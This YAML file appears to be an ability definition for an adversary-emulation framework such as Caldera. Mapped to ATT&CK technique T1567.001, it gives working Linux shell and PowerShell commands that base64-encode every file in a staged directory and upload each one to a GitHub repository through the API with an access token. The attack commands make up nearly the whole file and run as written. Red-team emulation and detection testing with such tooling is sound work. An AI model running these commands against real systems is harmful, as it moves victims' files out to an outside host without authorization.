- id: a201bec2-a193-4b58-bf0e-57fa621da474
  name: Exfil Directory Files to GitHub
  description: 'This ability will exfiltrate all files in a set staged directory to
    a repository in GitHub.

    '
  tactic: exfiltration
  technique:
    attack_id: T1567.001
    name: Exfiltration to Code Repository
  platforms:
    linux:
      sh:
        command: "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\"\
          ;\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\n\
          LocalDirectory=#{host.dir.staged};\nHeader=\"Authorization: token $GHPAT\"\
          ;\n\nfor file in $LocalDirectory/*.*; do\n  TempName=$(echo $file | sed\
          \ \"s/ /-/g\")\n\tRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename\
          \ \"$TempName\")\";\n\techo \"{\\\"message\\\":\\\"Committed $(basename\
          \ $TempName) at: $(date)\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\
          \":\\\"\" >/tmp/b64;\n  base64 -w 0 \"$file\" >>/tmp/b64;\n  echo \"\\\"\
          }\" >>/tmp/b64;\n\tcontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\"\
          \ -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName\
          \ -d @/tmp/b64);\n  rm /tmp/b64;\ndone;\n"
    windows:
      psh,pwsh:
        command: "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\"\
          ;\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n\
          $LocalDirectory = \"#{host.dir.staged}\";\n$token = $GHUser + \":\" + $GHPAT;\n\
          $basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers\
          \ = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n\n$Files = Get-ChildItem\
          \ $LocalDirectory;\nforeach ($file in $Files){\n    $RemoteName = \"$(Get-Date\
          \ -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n    $uri = \"https://api.github.com/repos/\"\
          \ + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n    $FileBytes\
          \ = Get-Content -Path $file.FullName -Encoding Byte;\n    $Base64EncodedFileBytes\
          \ = [System.Convert]::ToBase64String($FileBytes);\n    $Body = @{\n    \
          \    path = $file.Name;\n        branch = $GHBranch;\n        content =\
          \ $Base64EncodedFileBytes;\n        encoding = 'base64';\n        message\
          \ = \"Committed \" + $file.name + \" at: \" + (Get-Date);\n    } | ConvertTo-Json;\n\
          \    try {\n        $content = Invoke-RestMethod -Headers $Headers -Uri\
          \ $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n    } catch\
          \ {\n        if ($PSItem -notmatch \"but expected\") { $PSItem; }\n    \
          \    else { $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body\
          \ $Body -Method Put -ErrorAction SilentlyContinue; }\n    }\n};\n"
  requirements:
  - plugins.stockpile.app.requirements.paw_provenance:
    - source: host.dir.staged
